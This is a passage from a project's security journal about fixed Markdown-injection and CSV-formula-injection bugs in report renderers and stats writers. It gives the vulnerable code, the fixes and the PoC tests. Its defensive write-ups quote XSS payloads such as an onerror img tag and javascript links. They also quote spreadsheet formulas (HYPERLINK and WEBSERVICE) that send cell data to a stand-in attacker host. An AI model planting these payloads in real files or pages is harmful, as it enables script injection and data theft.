``stefanzweifel/git-auto-commit-action`` so the file is *publicly
published* on github.com (and any GitHub Pages site mirroring
``docs/``). The repo's ``docs/sitemap.xml`` even points to
``stations_validation_report.html`` — the file is a public,
search-indexed artefact.

Pre-fix sinks (eight orthogonal Markdown-rendering bullet lines, each
interpolating two-to-five operator-controlled fields):

  ```python
  # src/utils/stations_validation.py:to_markdown (pre-fix):
  # 1. Security warnings:
  f"- {sec_issue.identifier} ({sec_issue.name}): {sec_issue.reason}"
  # 2. Provider issues:
  f"- {provider_issue.identifier} ({provider_issue.name}): {provider_issue.reason}"
  # 3. Cross station ID issues (FIVE operator-controlled fields):
  f"- {cross_issue.identifier} ({cross_issue.name}): alias {cross_issue.alias!r} "
  f"collides with {cross_issue.colliding_field} of "
  f"{cross_issue.colliding_identifier} ({cross_issue.colliding_name})"
  # 4. Geographic duplicates (joined identifier list):
  f"- ({group.latitude:.5f}, {group.longitude:.5f}) → " + ", ".join(group.identifiers)
  # 5. Alias issues:
  f"- {alias_issue.identifier} ({alias_issue.name}): {alias_issue.reason}"
  # 6. Coordinate anomalies:
  f"- {coordinate_issue.identifier} ({coordinate_issue.name}): {coordinate_issue.reason}"
  # 7. GTFS mismatches (vor_id is operator-controlled):
  f"- {gtfs_issue.identifier} ({gtfs_issue.name}) → missing stop_id {gtfs_issue.vor_id}"
  # 8. Naming issues:
  f"- {naming_issue.identifier} ({naming_issue.name}): {naming_issue.reason}"
  ```

Four orthogonal Markdown-injection axes opened up at these sinks:

  (a) **Backtick inline-code-span break-out** — a name like
      ``Wien Hbf \`<img src=x onerror=alert(1)>\``` opens a CommonMark
      inline code span that lets the embedded HTML render as a live
      ``<img>`` tag in the public ``docs/stations_validation_report.md``
      artefact. CommonMark code spans render their interior verbatim
      and ``escape_markdown`` is the only defence (backslash-escaping
      the backtick collapses the code-span entirely).

  (b) **Markdown-link phishing** — a payload like
      ``[click here](javascript:alert(1))`` or
      ``[click here](https://evil.example)`` renders as a clickable
      Markdown link in the published report. An operator skimming the
      report on github.com sees a normal-looking link that points to
      an attacker-controlled destination — a usable phishing primitive
      against every repo watcher.

  (c) **Asterisk emphasis spoof** — ``*spoofed-bold*`` injects italic
      / bold emphasis the operator did not author. While individually
      low-impact, combined with semantic injection (e.g. ``*RESOLVED*``,
      ``*CRITICAL*``) it lets an upstream forge operator-facing
      visual signals.

  (d) **HTML angle-bracket injection** — although
      ``_UNSAFE_CHARS_RE`` in ``_find_security_issues`` flags
      ``<``/``>`` and ``_collect_blocking_issues`` in
      ``scripts/update_all_stations.py`` aborts the commit when those
      fire, that gate is **only active in the orchestrator script**.
      The standalone CLI invocation (``python -m src.cli stations
      validate``) and the ``manual-full-refresh.yml`` workflow's
      regenerate-step both bypass the gate entirely — a hostile
      ``stations.json`` produced by any of those paths flows
      verbatim into the renderer.

The threat surface at every sink is operator-controlled-but-
upstream-influenced:

  1. **`stations.json` is populated by cron-driven scripts** —
     ``scripts/update_all_stations.py`` orchestrates
     ``update_vor_stations.py`` / ``update_wl_stations.py`` /
     ``update_oebb_cache.py`` / ``fetch_google_places_stations.py`` /
     ``enrich_station_aliases.py`` — every one fans out to external
     API surfaces (VOR / OEBB / Wiener Linien / Google Places /
     OSM Overpass). A compromised upstream / DNS-hijack / MITM that
     returns a station with a hostile ``name`` field lands the
     payload in ``stations.json`` even when the per-fetch SSRF /
     DNS-rebinding / size-cap defences hold.
  2. **Cross-cutting** — every prior round's threat-model surface
     for cron-pipeline poisoning (leaked CI env, compromised
     secret store, intentional misconfig, partial flush + power
     loss on cache write) carries here.

The defence-in-depth contract collapses the cartesian product of
(upstream source × upstream-gate bypass × backtick / link / asterisk
/ angle-bracket axis × eight renderer sinks) into a single sanitiser
at the last gate before rendering.

**Fix:** A single canonical defence helper applied per-sink:

  ```python
  # src/utils/stations_validation.py — module-level helper:
  def _safe_md(text: object) -> str:
      """Compose normalise_markdown_text + escape_markdown for the
      stations validation report renderer."""
      return escape_markdown(
          normalise_markdown_text(str(text), max_len=_REPORT_FIELD_MAX_LEN)
      )

  # to_markdown — every text interpolation routed through _safe_md:
  f"- {_safe_md(sec.identifier)} ({_safe_md(sec.name)}): {_safe_md(sec.reason)}"
  # ... 14 more interpolations across the seven other sections
  ```

The helper is module-level (NOT nested inside ``to_markdown``) so it
adds zero to the C901 complexity counter — the function stays at its
baselined 18. The ``_REPORT_FIELD_MAX_LEN = 400`` cap is sized
generously enough for the longest legitimate ``reason`` (the alias-
issue ``f"missing required aliases: {…}"`` join can carry several
station names) while still bounding a planted-huge-field
amplification shape.

For the cross-station-id alias sink, the legacy ``{alias!r}`` (Python
repr — quotes the value but does NOT escape Markdown chars) is
replaced with explicit single-quote wrapping ``'{_safe_md(alias)}'``.
This preserves the rendered ``'Mitte'`` shape that
``test_markdown_rendering_contains_cross_station_id_section`` pins
while ensuring that hostile aliases like ``"Mitte`xss`"`` get the
backtick backslash-escaped.

For the geographic-duplicates sink, the joined identifier list uses
a generator expression (``", ".join(_safe_md(ident) for ident in
group.identifiers)``) so each element is sanitised independently —
catches a hostile identifier even when other identifiers in the
group are clean.

The lat/longitude formatting (``:.5f``) is not sanitised because
``DuplicateGroup.latitude`` / ``longitude`` are typed ``float`` and
validated by ``_extract_float`` (rejects NaN / inf / non-numeric)
on construction — numeric formatting is safe by construction.

**Tests:** Ten end-to-end PoC tests in
``tests/test_sentinel_stations_validation_markdown_injection.py``
exercise every sink with a layout-breaking payload:
  * Six per-issue-category backtick / link / emphasis tests
    (``test_security_issue_backtick_in_name_does_not_break_out_to_html``,
    ``test_alias_issue_backtick_in_reason_does_not_break_out_to_html``,
    ``test_naming_issue_markdown_link_in_reason_does_not_render_as_link``,
    ``test_provider_issue_markdown_link_in_name_does_not_render_as_link``,
    ``test_coordinate_issue_asterisk_emphasis_does_not_render_as_bold``,
    ``test_cross_station_id_issue_backtick_in_alias_does_not_break_out``).
  * Two list-and-aggregate tests
    (``test_duplicate_group_backtick_in_identifier_does_not_break_out``,
    ``test_gtfs_issue_backtick_in_vor_id_does_not_break_out``).
  * One end-to-end test
    (``test_end_to_end_hostile_stations_json_does_not_inject_markdown``)
    that builds a real ``stations.json`` with a hostile name, runs
    the full ``validate_stations`` pipeline, and asserts the rendered
    output contains no Markdown / HTML break-out primitives.
  * One inventory invariant
    (``test_to_markdown_sink_inventory_is_pinned``) that scans the
    source for the canonical pre-fix interpolation patterns and
    fails when ANY of the seven text-bearing sinks is reintroduced
    without the ``_safe_md`` wrapper.

All ten were verified to FAIL on the pre-fix code (the first one
caught the literal ``\`<img`` substring in the rendered output) and
to PASS on the post-fix code. The existing
``test_markdown_rendering_contains_cross_station_id_section`` was
updated to assert on ``"bst\\_code"`` (the underscore-escaped
form) rather than the raw ``"bst_code"`` to reflect the new
escaping contract.

**Learning:** Three reinforcing lessons:

  (a) **Every Markdown-emitting renderer in a project is a
      sister sink to every other Markdown-emitting renderer.** The
      2026-05-09 stats-dashboard round closed
      `scripts/generate_markdown_stats.py`. The 2026-05-09 Round 2
      closed `src/feed/reporting.py`. This Round 3 closed
      `src/utils/stations_validation.py`. The drift family is
      defined by the *output medium* (Markdown rendered on
      github.com / GitHub Pages / IDE viewers), not by the *source
      file*. A future round MUST treat any new ``to_markdown``-
      shaped function as a sister sink and audit the full chain
      from data source → renderer → published artefact in one
      sweep, not one renderer at a time.

  (b) **Upstream gates do not substitute for renderer-boundary
      defences.** ``_collect_blocking_issues`` in
      ``scripts/update_all_stations.py`` aborts the commit when
      ``_UNSAFE_CHARS_RE`` fires — a useful belt-and-suspenders
      check for the orchestrator's *write* path. But the renderer
      is invoked from THREE other code paths (standalone CLI,
      ``manual-full-refresh.yml`` regenerate step, any future
      direct caller) that bypass the gate entirely. The renderer
      MUST defend itself even when the typical caller has its own
      defences — the cartesian product of (caller bypass × payload
      shape) is too large to enumerate at every call site.

  (c) **`!r` repr-formatting is NOT a Markdown sanitiser.**
      ``f"alias {alias!r}"`` adds quotes around the value (useful
      for delimiting the alias text) but does not escape Markdown
      characters. A hostile ``alias = "Mitte\`xss\`"`` renders as
      ``alias 'Mitte\`xss\`'`` — the backtick still breaks out of
      any surrounding inline code span. The replacement pattern
      ``f"alias '{escape_markdown(alias)}'"`` preserves the visual
      delimiter while applying the canonical defence. The
      project-wide convention pinned by this round: NEVER use
      ``!r`` to "safe-quote" a string in a Markdown context;
      always use explicit quote-wrapping plus ``escape_markdown``
      (or ``safe_markdown_codespan`` for inline-code-span sinks).

## 2026-05-09 - Markdown Injection Drift Round 2: Inline-Code-Span and Fenced-Code-Block Break-Out at the Feed-Health / GitHub-Issue Renderer (`feed_path`, `error_log_path`, Diagnostics) — Env-Override Path-Boundary Sibling
**Vulnerability:** The 2026-05-09 stats-dashboard Markdown-injection
round (entry below) closed the renderer boundary in
`scripts/generate_markdown_stats.py` but its threat-model paragraph
on "Markdown rendering is the LAST sink in any text-data pipeline
that ends in a human-readable artefact (dashboard, **issue body**,
README); always treat it as a *defence boundary* even when an
upstream sanitiser exists" implicitly opened a sibling drift round:
the *next* Markdown-emitting modules in the project — `render_feed_
health_markdown` and `_GithubIssueReporter._build_body` in
`src/feed/reporting.py` — interpolate two operator-controlled file
paths *verbatim* inside ``\`…\``` inline code spans plus a
``\`\`\`text … \`\`\``` fenced code block.

Pre-fix sinks (five orthogonal break-out axes across two renderers
and one issue-body builder):

  ```python
  # src/feed/reporting.py:render_feed_health_markdown (line 531):
  lines.append(f"- **RSS-Datei:** `{report.feed_path}`")
  # src/feed/reporting.py:_GithubIssueReporter._build_body (line 1012):
  lines.append(f"- **Feed-Datei:** `{report.feed_path}`")
  # src/feed/reporting.py:_GithubIssueReporter._build_body (line 1063):
  lines.append(f"Weitere Details finden sich in der Logdatei "
               f"`{error_log_path}`.")
  # src/feed/reporting.py:_GithubIssueReporter._build_body (line 1057-1059):
  lines.append("```text")
  lines.append(diagnostics)         # ← contains f"Feed={feed_path}"
  lines.append("```")
  ```

Three orthogonal Markdown-injection axes opened up at these sinks:

  (a) **Backtick-in-inline-code-span** — CommonMark inline code spans
      render their interior verbatim and *backslashes are not
      escapes inside them* — the only character that closes the
      span is a literal backtick. ``feed_path = "docs/feed`<img src=x
      onerror=alert(1)>`.xml"`` closes the inline span at line 531 /
      1012 and lets ``<img src=x onerror=alert(1)>`` render as a
      live HTML tag in (i) the public ``docs/feed_health.md``
      artefact (auto-committed by the workflow, rendered by GitHub
      on the public repo browser, by every operator's IDE / Markdown
      viewer, by any static-site builder downstream) and (ii) the
      auto-submitted GitHub Issue body (visible to every repo
      watcher; the issue is opened on every failed feed run, so
      every reader of the project's notifications channel sees it).
      Same primitive at line 1063 with ``error_log_path``.
  (b) **Newline-injection in inline code span** — embedded ``\n`` /
      ``\r`` / U+2028 LINE SEP / U+2029 PARA SEP in ``feed_path``
      split the bullet-list item across multiple lines. A path
      ``"docs/foo\n## INJECTED HEADER\n.xml"`` rendered the second
      line as a real Markdown ATX H2 header in the public Feed-
      Health report — turning operator-supplied path bytes into an
      arbitrary new section in the dashboard.
  (c) **Triple-backtick fence-break inside the diagnostics fenced
      code block** — the ``\`\`\`text … \`\`\``` block at line 1057-
      1059 wraps `diagnostics_message()` which contains
      ``f"Feed={self.feed_path}"`` without sanitation. A payload
      ``feed_path = "docs/feed.xml\n\`\`\`\n# INJECTED H1\n\`\`\`"``
      lands a ``\`\`\``` on its own line *inside* the fence; CommonMark
      closes the fence there and the H1 header escapes the block
      into the public GitHub Issue body. Multi-line + triple-
      backtick is the canonical CommonMark fence-break primitive.

The threat surface at every sink is operator-controlled:

  1. **`OUT_PATH` env override → `report.feed_path`** —
     ``out_path = validate_path(Path(feed_config.OUT_PATH), "OUT_PATH")``
     in `src/build_feed.py:2380` resolves the env-driven path; the
     resolver only checks the *first path component* against
     ``ALLOWED_ROOTS = {"docs", "data", "log"}`` (line 36 of
     `src/feed/config.py`). Backticks, newlines, BiDi marks, and
     line/paragraph separators in the *rest* of the path survive
     the validator unchanged. ``OUT_PATH=docs/feed\`xss\`.xml``
     passes ``validate_path`` and lands in ``RunReport.finish(...)``
     verbatim via ``out_path.as_posix()``.
  2. **`LOG_DIR` env override → `error_log_path`** —
     ``LOG_DIR_PATH = resolve_env_path("LOG_DIR", Path("log"),
     allow_fallback=True)`` (line 326 of `src/feed/config.py`)
     applies the same first-component validator; a poisoned
     ``LOG_DIR=log\`xss\`/sub`` lands in ``error_log_path`` after
     ``error_log_path = Path(LOG_DIR) / "errors.log"``.
  3. **Cross-cutting** — every prior round's threat-model surface
     for env overrides (leaked CI env, compromised secret store,
     intentional misconfig, partial flush + power loss on `.env`
     write) carries here. The defence-in-depth contract collapses
     the cartesian product of (env source × path-validator
     bypass × backtick / newline / BiDi axis × renderer sink) into
     a single sanitiser at the last gate before rendering.

The Feed-Health report and the auto-submitted GitHub Issue are the
project's two highest-visibility human-facing renderers: the
report is committed back to `docs/` (a public artefact mirrored on
the GitHub Pages site), and the issue is opened on every failed
feed run (visible to every repo watcher). Each renderer was missing
the canonical ``escape_markdown`` / ``safe_markdown_codespan``
defence the prior round pinned for the stats dashboard.

**Fix:** Five context-specific applications of the canonical
``safe_markdown_codespan`` helper from
``src/utils/text.py:412-425`` (the same helper introduced by the
2026-05-09 Markdown-injection round, which composes
``normalise_markdown_text`` — strips C0/C1 controls + Trojan-Source
/ line-terminator union + ZWSP family + BiDi marks, collapses
whitespace to a single space — and replaces every literal backtick
with the project-wide apostrophe convention pinned by
``_sanitize_code_span``):

  ```python
  # render_feed_health_markdown (line 531):
  lines.append(
      f"- **RSS-Datei:** `{safe_markdown_codespan(report.feed_path)}`"
  )

  # _build_body (line 1012):
  lines.append(
      f"- **Feed-Datei:** `{safe_markdown_codespan(report.feed_path)}`"
  )

  # _build_body fenced code block (line 1057-1059):
  lines.append("```text")
  # 50 000-char cap is well above any realistic diagnostics size and
  # well below _MAX_GITHUB_BODY_LENGTH = 60 000 which the downstream
  # _bounded_github_body call enforces on the rendered body.
  lines.append(safe_markdown_codespan(diagnostics, max_len=50_000))
  lines.append("```")

  # _build_body (line 1063):
  lines.append(
      "Weitere Details finden sich in der Logdatei "
      f"`{safe_markdown_codespan(str(error_log_path))}`."
  )
  ```

The helper is applied per-sink (matching the project's existing
``escape_markdown_cell`` / ``escape_markdown`` / ``_sanitize_code_
span`` per-sink convention) so a future code path that bypasses
``RunReport.finish`` (debug fixture, alternate logger handler,
unit-test stub) inherits the defence at the renderer boundary
rather than at the boundary that captured the path.

For the fenced code block, the cap is raised from the helper's
default ``max_len=200`` to ``max_len=50_000`` — well above the
realistic diagnostics size (each warning capped at 2000 chars,
100 warnings max) and well below
``_MAX_REPORT_MESSAGE_LENGTH * _MAX_REPORT_MESSAGE_COUNT`` worst-
case. The downstream ``_bounded_github_body`` (60 000-char cap with
line-boundary truncation) already enforces the GitHub Issue API
limit, so the fenced-code-block sanitiser is layered between the
diagnostics aggregator and the body cap.

**Tests:** Seven end-to-end PoC tests in
``tests/test_sentinel_reporting_codespan_injection.py`` exercise
each sink with a layout-breaking payload:
  * `test_feed_health_markdown_feed_path_backtick_breaks_inline_code_span`
    — backtick + ``<script>`` payload in ``feed_path`` → must stay
    inside one inline code span (exactly two backticks on the
    bullet line, post-fix).
  * `test_feed_health_markdown_feed_path_newline_breaks_layout` —
    newline + ATX H2 payload → must not surface as a real H2.
  * `test_feed_health_markdown_feed_path_bidi_marks_stripped` —
    LRO + ZWSP + BOM → must be stripped.
  * `test_github_issue_body_feed_path_backtick_breaks_inline_code_span`
    — same backtick primitive at the GitHub Issue sink.
  * `test_github_issue_body_error_log_path_backtick_breaks_inline_code_span`
    — same backtick primitive at the ``error_log_path`` sink (uses
    `monkeypatch.setattr` on the imported reference because
    ``LOG_DIR`` is captured at module load time).
  * `test_github_issue_body_feed_path_fence_break_via_newline` —
    ``\n\`\`\`\n`` payload in ``feed_path`` → fenced code block
    keeps exactly two ``\`\`\``` fences, no escaped H1.
  * `test_inline_code_span_sinks_inventory_pinned` — inventory
    invariant: a future refactor that introduces a fourth ``\`…\```
    inline code span sourced from an env-controlled string without
    going through ``safe_markdown_codespan`` re-opens this
    Markdown-injection vector and trips the inventory test.

All seven were verified to FAIL on the pre-fix code before the fix
was applied, and to PASS on the post-fix code. The `responses`-
mocked GitHub Issue submission pattern mirrors the existing
``test_reporting_github.py`` fixture (monkeypatched SSRF guard +
single registered POST URL + body capture from `responses.calls[0]`).

**Learning:** Two reinforcing lessons:

  (a) **Inline code spans and fenced code blocks are *separate*
      defence boundaries from "raw HTML / Markdown links / table
      cells" — and they require separate defences.** The 2026-05-09
      stats-dashboard round pinned ``escape_markdown`` /
      ``escape_markdown_cell`` for the bold-header / table-cell
      sinks; this round pins ``safe_markdown_codespan`` for the
      inline-code-span / fenced-code-block sinks. CommonMark's
      "backslash escapes are not active inside code spans / code
      blocks" rule means the canonical ``escape_markdown``
      sanitiser does *nothing* useful inside backticks — a
      sanitised value still surfaces its embedded backtick and
      closes the span. The helper-pair canonicalised in
      ``src/utils/text.py`` (``escape_markdown`` /
      ``escape_markdown_cell`` / ``safe_markdown_codespan`` /
      ``normalise_markdown_text``) maps 1-to-1 onto the four
      Markdown sink contexts (raw text, table cell, inline code,
      fenced code). Audit every f-string interpolation against the
      sink's specific defence — the wrong sanitiser is as bad as
      no sanitiser.

  (b) **The path-validator-only-checks-first-component pattern is
      a recurring drift surface.** ``validate_path``
      (`src/feed/config.py:208-224`) checks
      ``rel.parts[0] in ALLOWED_ROOTS`` — every byte AFTER the
      first component is unconstrained. This is the right shape
      for filesystem-traversal defence (it pins the path inside
      the repo) but the *wrong* shape for Markdown / log /
      shell-quoting defence at downstream consumers. Every public
      string that flows out of an env-controlled path consumer —
      ``OUT_PATH``, ``LOG_DIR``, ``FEED_HEALTH_PATH``,
      ``FEED_HEALTH_JSON_PATH``, ``STATE_FILE``, future env-driven
      paths — must be sanitised at every sink that interprets the
      value as anything other than a filesystem path. The
      inventory test pins the audited sinks programmatically;
      future drift trips on the test instead of waiting for the
      next Sentinel pass.

## 2026-05-09 - Markdown Injection Sibling Drift (CWE-79 / CWE-1236-adjacent) at the Stats-Dashboard Renderer Boundary: `direction`, `provider`, `location_name` Interpolated Verbatim Into `docs/statistik.md`
**Vulnerability:** The 2026-05-09 CSV-formula-injection round closed
the *write* side of `data/stats/*.csv` but explicitly flagged a
sibling-drift candidate for the next round:

> Markdown rendering of the same fields
> (`scripts/generate_markdown_stats.py:585,600,511` — Markdown table
> cells `f"| {direction} | {count} |"` interpolate the *same*
> upstream-influenced strings without escaping `|` / `*` / `` ` `` /
> `<` / `>` / `[`) is a sibling drift candidate flagged here for the
> next round: defanging at the CSV write does NOT cover the
> markdown-injection axis when the same data is re-rendered into
> `docs/statistik.md`.

That sibling was open: four CSV-derived sinks in
`scripts/generate_markdown_stats.py` (pre-fix) interpolated the
operator-/upstream-influenced ``direction`` / ``provider`` /
``location_name`` cells *verbatim* into Markdown:

  ```python
  # _format_directions_section (line 585):
  lines.append(f"| {direction} | {count} |")          # table cell
  # _format_providers_section (line 600):
  lines.append(f"| {provider} | {count} |")           # table cell
  # render_top_locations (line 491):
  _bar_line(loc[:30], …)                              # `…` code-span label inside ``` fence
  # render_top_locations (line 511):
  lines.append(f"**{loc}**")                          # bold header, no fence
  ```

Four orthogonal Markdown-injection axes opened up at these sinks:

  (a) **Pipe `|` in a table cell** — adds extra columns, breaks the
      2-column table layout. A poisoned ``provider`` value
      ``"ÖBB | INJECTED | extra"`` renders as a 4-column row that
      mis-aligns every subsequent cell in the operator's
      observability dashboard.
  (b) **HTML tags in `**…**` bold context** — the bold header is
      *outside* any code fence, so GFM-spec-compliant renderers
      happily process inline HTML there. A poisoned
      ``location_name`` ``"<img src=x onerror=alert(1)>"`` lands a
      usable HTML tag in the dashboard. GitHub's own renderer
      sanitises ``<script>`` but every operator's local IDE /
      static-site builder has its own policy.
  (c) **Backtick in `` `…` `` code-span label** — CommonMark code
      spans render their interior verbatim and *backslashes are not
      escapes inside them* — the only character that can close the
      span is a literal backtick. A poisoned ``location_name``
      ``"Foo`evil`bar"`` prematurely closes the inline code span,
      leaking the bar-chart separator and glyphs as plain Markdown.
  (d) **Embedded newlines (``\n`` / ``\r`` / U+2028 LINE SEP / U+2029
      PARA SEP)** — `csv.reader` happily parses a quoted multi-line
      cell. A row whose ``direction`` is ``"Foo\n## INJECTED HEADER"``
      pre-fix split the table row at the embedded ``\n`` and the
      second line **was rendered as a real H2 Markdown header**
      ("## INJECTED HEADER | 1 |"), turning operator-supplied data
      into an arbitrary new section in the public dashboard.

The threat model spans three orthogonal poisoning vectors that
already bypass the CSV-write defang:

  1. **Cache-poisoning vector**: ``cache/wl/wl_baustellen.json`` and
     ``cache/wl/events.json`` re-emit ``ev["source"]`` verbatim into
     ``provider`` (``src/providers/wl_fetch.py:736,858``). The CSV
     formula-prefix sanitiser strips ``=``/``+``/``-``/``@``/`\t`/`\r`
     and C0/C1 control bytes — but PRESERVES every Markdown
     metacharacter (`|` / `*` / `` ` `` / `<` / `>` / `[` / `]` / `(`
     / `)` / `_` / `#` / `~` / `\\`). A poisoned cache file with
     ``"source": "ÖBB | INJECTED"`` survives the CSV writer's
     formula-defang untouched and lands in ``data/stats/
     stoerungen_*.csv``, then in ``docs/statistik.md``.
  2. **Stations-directory poisoning vector**: ``data/stations.json``
     flows through ``display_name`` into ``direction`` (the
     `update_stammstrecke_status` round). Same Markdown-metachar
     residue.
  3. **Historical-row vector**: rows committed before the
     2026-05-09 formula-write sanitiser landed remain on disk
     unchanged. Even if the writer were perfect for new rows, the
     dashboard re-renders the historical CSV every cron tick — the
     render boundary is the LAST gate.

Each rendered ``docs/statistik.md`` is committed back to the
repository (the `generate-stats.yml` workflow auto-commits) and
becomes a public artefact: rendered by GitHub on the public repo
browser, by every operator's local IDE / Markdown viewer, by any
static-site builder downstream.

**Fix:** Two sibling helpers in ``src/utils/text.py`` plus
context-specific application at every sink:

  1. ``normalise_markdown_text(text, *, max_len=200)`` — strips C0/C1
     controls (except TAB/LF/CR which the whitespace-collapse step
     replaces with a single space, preserving operator readability),
     plus the canonical Trojan-Source / line-terminator union pinned
     in ``src/utils/logging.py``: ALM (`؜`), ZWSP-ZWJ + LRM/RLM
     (`​-‏`), LINE/PARA SEP + LRE/RLE/PDF/LRO/RLO
     (` -‮`), LRI/RLI/FSI/PDI (`⁦-⁩`), and BOM
     (`﻿`). Collapses every whitespace run to a single space and
     caps length at ``max_len``.
  2. ``safe_markdown_codespan(text, *, max_len=200)`` — same
     normalisation, plus replaces literal backticks with apostrophes
     (the project-wide convention pinned by
     ``src.feed.reporting._sanitize_code_span``). Used wherever the
     output flows into a `` `…` `` inline code span where backslash
     escapes are inert by CommonMark.

  At each sink in ``scripts/generate_markdown_stats.py``:

  ```python
  # _format_directions_section / _format_providers_section
  cell = escape_markdown_cell(
      normalise_markdown_text(direction, max_len=80)
  )
  lines.append(f"| {cell} | {count} |")           # \| escaped, HTML defanged

  # render_top_locations bold header
  safe_loc = escape_markdown(
      normalise_markdown_text(loc, max_len=80)
  )
  lines.append(f"**{safe_loc}**")                  # <script>→&lt;script&gt;, [link]→\[link\]

  # render_top_locations bar-chart label
  bar_label = safe_markdown_codespan(
      loc, max_len=30
  )
  lines.append(_bar_line(bar_label, …))            # backticks→apostrophes, \n→space
  ```

Reuses the existing pattern from ``src/feed/reporting.py`` (which
already routes Feed-Health-report fields through
``escape_markdown`` / ``escape_markdown_cell``) — the dashboard
renderer was the only Markdown emitter that skipped the defence.

**Tests:** Seven end-to-end PoC tests in
``tests/scripts/test_generate_markdown_stats_md_injection.py``
exercise each sink with a layout-breaking payload (pipe in
direction / provider table cell, ``<script>``-tag in bold header,
Markdown-link in bold header, backtick in code-span label,
newline-injected H2 header, full poisoned-CSV-row → safe-Markdown
end-to-end). All seven were verified to FAIL on the pre-fix code
before the fix was applied. Companion unit tests in
``tests/test_text_markdown_helpers.py`` pin the
``normalise_markdown_text`` / ``safe_markdown_codespan`` contract
(BiDi marks, line separators, C1 controls, ZWSP family, length
cap, legitimate-Unicode preservation).

**Learning:** When the prior round's journal entry explicitly
flags a *named* sibling-drift candidate ("flagged here for the
next round" + concrete file/line citations), the next Sentinel
pass should treat it as the highest-priority hunt — the threat
analysis is already done, only the boundary application is
missing. Markdown rendering is the LAST sink in any text-data
pipeline that ends in a human-readable artefact (dashboard,
issue body, README); always treat it as a *defence boundary*
even when an upstream sanitiser exists, because the upstream's
threat model (formula prefixes, control bytes) is rarely the
same as the renderer's (HTML, table cells, code spans, BiDi). A
single ``escape_markdown`` / ``escape_markdown_cell`` /
``safe_markdown_codespan`` triple, paired with a
``normalise_markdown_text`` whitespace/control-byte normaliser,
is the canonical defence shape — the Feed-Health renderer
already used it; the dashboard's omission was pure drift.

## 2026-05-09 - CSV Formula Injection (CWE-1236) at the Stats-Writer Boundary: `provider`, `location_name`, `direction` Persisted Verbatim Into `data/stats/*.csv`
**Vulnerability:** `append_stammstrecke_row` and
`append_disruption_row` (`src/utils/stats.py:219-273`, pre-fix) — the
two append-only CSV writers that persist the project's observability
ledgers under `data/stats/<kind>_YYYY.csv` — accepted three
operator-/upstream-influenced text fields verbatim and handed them to
`csv.writer` without any spreadsheet-formula neutralisation:

  ```python
  row = (
      when.isoformat(timespec="seconds"),
      WEEKDAY_LABELS[when.weekday()],
      f"{when.hour:02d}",
      direction,                                  # ← writer #1
      _format_delay(delay_minutes),
  )
  ...
  row = (
      when.isoformat(timespec="seconds"),
      WEEKDAY_LABELS[when.weekday()],
      f"{when.hour:02d}",
      provider.strip() or "unbekannt",            # ← writer #2 cell A
      location_name.strip() or "unbekannt",       # ← writer #2 cell B
  )
  ```

Excel, LibreOffice Calc, and Google Sheets evaluate any cell whose
content begins with `=`, `+`, `-`, `@`, TAB (`\t`), or CR (`\r`) as a
*formula* on file open — the OWASP "CSV Injection" / CWE-1236
vector. The three text fields each map to a real upstream poisoning
surface that the existing audit family had not closed:

  (a) **`provider`** — `src/build_feed.py:1675` passes
      `str(it.get("source") or "unbekannt")`. Today's providers
      hardcode `"ÖBB"` / `"Wiener Linien"` / `"VOR/VAO"`, but
      `src/providers/wl_fetch.py:736` and `:858` re-emit
      `ev["source"]` and `b["source"]` *verbatim* from on-disk cache
      entries (`cache/wl/wl_baustellen.json`, `cache/wl/events.json`)
      — a poisoned cache file (writeable on the same runner that
      executes the cron, so any cache-tampering primitive lands
      here) inserts arbitrary strings into `provider`.
  (b) **`location_name`** — extracted from upstream titles /
      descriptions via `extract_location_name`. Today's anchored
      `[A-ZÄÖÜ]…` regex set blocks formula prefixes by construction,
      but the writer is a *public helper* whose contract accepts any
      string; a future loosening of the heuristic, or any new caller
      added under `src/utils/stats.py` users, inherits the open
      surface.
  (c) **`direction`** — `scripts/update_stammstrecke_status.py:735`
      passes `direction.target_label`, which is populated at module
      import time from `display_name(canonical_name(seed))` reading
      `data/stations.json`. A poisoned station directory (the
      directory file is the same on-disk write target the JSON
      size-bomb / TOCTOU rounds named) lands arbitrary strings into
      `direction`.

Each of these three ports is the LAST gate before the string flows
into a CSV cell that some operator will eventually open in a
spreadsheet (the `data/stats/` ledger is the documented source for
the dashboard regenerator and is committed to the repo for human
inspection — `docs/statistik.md` notes the file paths verbatim, and
the `generate-stats.yml` workflow renders them on every cron tick).
A payload like `=cmd|'/c calc'!A1`,
`=HYPERLINK("http://attacker.example/?d="&A1,"click")`,
`@WEBSERVICE("http://attacker.example")`, or
`+IFERROR(REQUEST("http://…"),0)` lands in the cell verbatim and
fires on every operator who double-clicks the CSV — turning
observability data into an attacker-controlled exfiltration / RCE
amplifier. NUL / BEL / DEL / VT / FF / SI/SO control bytes were also
preserved by `.strip()` (which only handles whitespace), and a NUL
mid-cell silently truncates the field in some downstream CSV reader
variants (the project's own `_iter_csv_rows` walks `csv.reader` over
a `StringIO` — robust enough not to truncate, but the dashboard's
provider/location keys would carry the NUL into the rendered
Markdown indistinguishably from a legitimate cell).

The whitespace-evasion sub-vector compounds the threat: the
pre-fix writer ran `provider.strip() or "unbekannt"` *before*
storing the cell — but `"   =cmd"` survives that strip path
unchanged (the strip removes whitespace, leaves `"=cmd"`), and
`"=cmd"` is the formula. Conversely `"\t=cmd".strip()` returns
`"=cmd"` (TAB is whitespace), and any future caller that does its
own `.strip()` before passing the value — or any future strip added
inside the writer itself — would defang the leading TAB / CR but
LEAVE the still-formula-prefixed remainder in place. The
formula-prefix check therefore must run *after* whitespace is
stripped, not before, otherwise a leading-whitespace evasion lands.

**Fix:** Single new boundary sanitiser
`_sanitize_csv_text_field` (`src/utils/stats.py:78-117`) applied to
all three text cells in both writers, so the cartesian product of
upstream-source / cache-poisoning / directory-poisoning / future-
caller vectors collapses into one defence:

  1. **Strip C0/C1 control bytes** — `\x00-\x08`, `\x0B`, `\x0C`,
     `\x0E-\x1F`, `\x7F`. Excludes TAB (`\x09`), LF (`\x0A`), CR
     (`\x0D`) from the body strip — `csv.QUOTE_MINIMAL` already
     wraps embedded newlines and embedded TAB is benign for the
     default `,` delimiter; *leading* TAB / CR are still defanged
     in step 4. NUL is the principal new defence: pre-fix it
     survived `.strip()` and could silently truncate downstream
     CSV readers.
  2. **Strip leading/trailing whitespace** — performed *before* the
     formula-prefix check. A leading-whitespace payload like
     `"   =cmd"` cannot evade the prefix branch by surviving the
     strip step and being whitespace-collapsed by a downstream
     consumer; the in-sanitiser strip + prefix-check ordering is
     the *only* ordering that closes both the leading-TAB
     (`"\t=cmd"`, where TAB is whitespace and survives no-strip)
     and the leading-space (`"   =cmd"`, where leading space
     bypasses the formula-prefix tuple) sub-vectors in one pass.
  3. **Cap length** at 200 chars — second-layer clamp at the CSV
